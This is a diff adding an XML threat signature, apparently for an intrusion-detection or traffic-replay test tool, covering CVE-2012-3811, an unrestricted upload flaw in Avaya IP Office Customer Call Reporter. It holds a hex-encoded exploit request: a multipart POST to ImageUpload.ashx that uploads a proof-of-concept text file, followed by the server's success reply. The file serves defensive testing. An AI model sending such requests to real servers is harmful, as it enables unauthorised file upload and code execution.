@@ -1,0 +1,87 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Avaya IP Office Customer Call Reporter ImageUpload.ashx Unrestricted File Upload"/>
+    <EngDesc display="true" value="A vulnerability has been reported in Avaya's IP Office Customer Call Reporter. The vulnerability is due to the ImageUpload.ashx page failing to restrict the content uploaded to a server. A remote, unauthenticated attacker could exploit this vulnerability by sending a crafted web request by way of the ImageUpload.ashx resource. A successful exploitation attempt could result in the execution of arbitrary code in the security context of the web server."/>
+    <Intent display="true">
+      <item value="INPUT_VALIDATION_ERROR"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="Critical"/>
+    <Known_Vendors_Affected display="true">
+      <item value="Avaya"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="IP_Office_Customer_Call_Reporter"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="7.0"/>
+      <item value="8.0"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20120629-03"/>
+    <CVEID display="true" value="CVE-2012-3811"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="83399"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="5008293e7adf5094c9562db6cf7607ef"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="NETWORK"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="635350734756234560"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1400059818" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="D"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="B">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:50:56:B4:03:10" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="03BE" Identification="42D1" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="92C6" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="46539" destPort="$HTTPdestPort" SeqNumber="6AE567B0" AckNumber="3F5E0559" HeaderLength="08" WindowSize="002E" Checksum="CBCA" UrgentPointer="0000" Options="0101080A22A9256200000000" Payload="504F5354202F434352576562436C69656E742F57616C6C626F6172642F496D61676555706C6F61642E6173687820485454502F312E300D0A486F73743A203137322E31362E382E3132380D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520362E303B2057696E646F7773204E5420352E31290D0A436F6E74656E742D547970653A206D756C7469706172742F666F726D2D646174613B20626F756E646172793D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D51585A68655745675A6D6C735A534231634778765957513D0D0A436F6E74656E742D4C656E6774683A203635320D0A0D0A2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D51585A68655745675A6D6C735A534231634778765957513D0D0A436F6E74656E742D446973706F736974696F6E3A20666F726D2D646174613B206E616D653D225261645541475F66696C656E616D65220D0A0D0A54534C2E7478740D0A2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D51585A68655745675A6D6C735A534231634778765957513D0D0A436F6E74656E742D446973706F736974696F6E3A20666F726D2D646174613B206E616D653D225261645541475F64617461220D0A0D0A5645564D56564D675532566A64584A7064486B675447466963794251636D39765A6942765A6942446232356A5A58423044516F3D0D0A2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D51585A68655745675A6D6C735A534231634778765957513D0D0A436F6E74656E742D446973706F736974696F6E3A20666F726D2D646174613B206E616D653D225261645541475F746172676574466F6C646572220D0A0D0A2E0D0A2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D51585A68655745675A6D6C735A534231634778765957513D0D0A436F6E74656E742D446973706F736974696F6E3A20666F726D2D646174613B206E616D653D2255706C6F6164496D61676554797065220D0A0D0A300D0A2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D51585A68655745675A6D6C735A534231634778765957513D0D0A436F6E74656E742D446973706F736974696F6E3A20666F726D2D646174613B206E616D653D2257616C6C626F6172644944220D0A0D0A300D0A2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D51585A68655745675A6D6C735A534231634778765957513D2D2D" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:50:56:B4:03:10" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="01E4" Identification="3546" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="622B" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="46539" SeqNumber="3F5E0559" AckNumber="6AE56B3A" HeaderLength="08" WindowSize="FC75" Checksum="DCB6" UrgentPointer="0000" Options="0101080A0034A49322A92560" Payload="485454502F312E3120323030204F4B0D0A436F6E6E656374696F6E3A20636C6F73650D0A446174653A204D6F6E2C2030332044656320323031322032313A31383A353220474D540D0A5365727665723A204D6963726F736F66742D4949532F362E300D0A582D506F77657265642D42793A204153502E4E45540D0A582D4173704E65742D56657273696F6E3A20322E302E35303732370D0A5365742D436F6F6B69653A2030424137343744382D423146302D343563622D394130442D3838383830413843374344333D6C676168687A666F6D6A70776C676D76756C7134647962623B20706174683D2F3B20487474704F6E6C790D0A43616368652D436F6E74726F6C3A20707269766174650D0A436F6E74656E742D547970653A20746578742F68746D6C3B20636861727365743D7574662D380D0A436F6E74656E742D4C656E6774683A203130300D0A0D0A7B224A534F4E44617461223A5B7B224B6579223A225261645541475F66696E616C46696C6552657175657374222C2256616C7565223A66616C73657D2C7B224B6579223A225261645541475F73756363657373222C2256616C7565223A747275657D5D7D" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
